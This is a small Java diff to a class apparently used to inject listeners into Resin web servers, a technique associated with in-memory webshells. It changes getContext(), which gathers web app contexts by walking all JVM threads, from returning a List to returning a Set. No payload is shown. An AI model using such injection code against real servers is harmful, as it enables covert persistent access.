@@ -28,7 +28,7 @@ public class ResinListenerInjector {
     }
 
     public ResinListenerInjector() {
-        List<Object> contexts = null;
+        Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
@@ -66,7 +66,7 @@ public class ResinListenerInjector {
         return c + "(" + r + ")";
     }
 
-    public List<Object> getContext() throws Exception {
+    public Set<Object> getContext() throws Exception {
         Set<Object> contexts = new HashSet<Object>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
@@ -82,7 +82,7 @@ public class ResinListenerInjector {
                 contexts.add(webApp);
             }
         }
-        return Arrays.asList(contexts.toArray());
+        return contexts;
     }
 
     public ClassLoader getWebAppClassLoader(Object context) throws Exception {
